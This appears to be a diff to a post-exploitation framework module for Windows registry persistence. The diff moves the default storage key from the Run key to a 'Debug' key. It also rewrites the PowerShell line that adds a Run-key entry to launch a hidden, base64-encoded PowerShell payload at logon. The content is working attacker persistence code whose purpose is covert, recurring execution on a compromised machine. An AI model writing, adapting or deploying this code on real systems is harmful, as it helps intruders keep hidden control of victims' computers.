@@ -50,7 +50,7 @@ class Module:
             'RegPath' : {
                 'Description'   :   'Registry location to store the script code. Last element is the key name.',
                 'Required'      :   False,
-                'Value'         :   'HKCU:Software\Microsoft\Windows\CurrentVersion\Run'
+                'Value'         :   'HKCU:Software\Microsoft\Windows\CurrentVersion\Debug'
             },
             'ADSPath' : {
                 'Description'   :   'Alternate-data-stream location to store the script code.',
@@ -229,7 +229,7 @@ class Module:
 
         # set the run key to extract the encoded script from the specified location
         #   and start powershell.exe in the background with the encoded command
-        script += "$null=Set-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name "+keyName+" -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";start -Win Hidden -A \"-enc $x\" powershell\"';"
+        script += "$null=Set-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name "+keyName+" -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";powershell -Win Hidden -enc $x\"';"
 
         script += "'Registry persistence established "+statusMsg+"'"
 
